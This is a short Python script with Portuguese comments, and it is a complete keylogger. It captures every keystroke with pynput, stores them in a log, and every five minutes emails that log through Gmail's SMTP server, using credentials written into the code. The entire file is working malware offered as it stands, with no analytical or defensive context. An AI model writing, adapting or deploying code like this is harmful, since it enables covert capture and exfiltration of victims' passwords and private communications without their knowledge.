from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

# configurações do email
EMAIL_ORIGEM = "email@gmail.com"
EMAIL_DESTINO = "email@gmail.com"
SENHA = "werr poiu hjkj hjgh"  # senha do email de origem


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Keylogger Report'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA)
            server.send_message(msg)
            server.quit()
            log = ""  # limpa o log após o envio (opcional)
        except Exception as e:
            print(f"Erro ao enviar email: {e}")

    # inicia o timer para enviar email a cada 5 minutos
    Timer(300, enviar_email).start()  # agenda o próximo envio em 5 minutos


def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.esc:
            log += "\n[ESC]\n"
        else:
            pass  # IGNORAR SPACE, SHIFT, CTRL, ETC


# Inicializa o log e inicia o envio de email
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()  # inicia o processo de envio de email
    listener.join()
